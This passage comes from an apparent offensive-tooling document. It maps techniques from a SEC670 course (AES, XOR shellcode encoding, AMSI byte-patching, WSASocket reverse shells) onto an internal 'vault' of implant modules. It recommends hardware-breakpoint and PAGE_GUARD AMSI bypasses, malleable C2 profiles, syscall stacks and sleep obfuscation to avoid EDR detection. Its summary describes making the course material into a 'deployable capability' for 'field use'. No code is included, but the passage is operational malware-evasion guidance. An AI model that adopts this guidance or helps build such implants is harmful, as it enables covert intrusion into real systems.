| AES via legacy CryptoAPI (`PROV_RSA_AES`) | T-021 Crypto (`aes-gcm` crate, AES-256-GCM) | Vault uses authenticated encryption; SEC670's path is deprecated and signatured — use vault path |
| AES via CNG BCrypt (CBC mode) | T-021 Crypto (AES-256-GCM) | Vault uses GCM (authenticated, no IV-reuse class); CBC is cryptographically weaker |
| XOR "encryption" of shellcode | T-021 shellcode encoders (IPv4/IPv6/MAC/UUID/words) | Vault encoders produce format-matched innocuous-looking output; XOR produces obviously-encrypted bytes |
| Base64 via `CryptStringToBinaryA`/`CryptBinaryToStringA` | T-022 Network Suite (malleable C2 profiles) | Vault handles encoding at transport layer via profile config |
| `certutil.exe -encode` | (none directly) | LOLBin path; vault does not use `certutil` for any operational purpose |
| AMSI patch via code cave (Lab 5.4) | T-016 EDR Evasion Suite (`amsi_hbp.rs`, `amsi_page_guard.rs`) | Vault uses HW breakpoints and PAGE_GUARD — leaves bytes intact, defeats integrity-checking EDRs. SEC670's byte-patch is the classic but signatured approach |
| Custom shell (Lab 5.5 ShadowCraft) | T-023 Client Capabilities (`commands.rs` dispatch FSM, full capability set) | Vault's `client_rust` is the production-grade evolution of what SEC670 has the student build as a capstone |
| `WSASocketW` redirected-stdio reverse shell | (none directly) | Older tradecraft the vault does not implement; operators should prefer the vault's `tcp_transport.rs` + `hvnc.rs` / `vnc_server.rs` for remote GUI access |
| PE loader dependence on `/NODEFAULTLIB` | T-021 (`build.rs` build-time config embedding) | Vault's `dark_crystal/crates/core/build.rs` embeds config at compile time; the no-CRT discipline is inherited from the Rust `no_std`/`windows-sys` model rather than MSVC flags |

---

**Operator-grade summary**: SEC670 Section 5 is the *baseline tradecraft vocabulary* — WinHTTP/WinInet/WSASocket, MSVC PIC compilation, AES-via-CNG, AMSI byte-patch. The vault's T-004/T-006/T-016/T-021/T-022/T-023 implementations are the *operational successors* to each of these. An operator working from this training material alone will produce a working but easily-detected implant; pairing it with the vault's syscall stack (`T-001`–`T-003`), sleep obfuscation (`T-005`), and HW-bp AMSI path (`T-016`) is what transforms SEC670 from a teaching curriculum into a deployable capability. The single most important operational delta: SEC670 never addresses user-mode hooking — every API call in SEC670 is a hookable direct call. Wrap everything from SEC670 in `T-001 RecycledGate` before field use.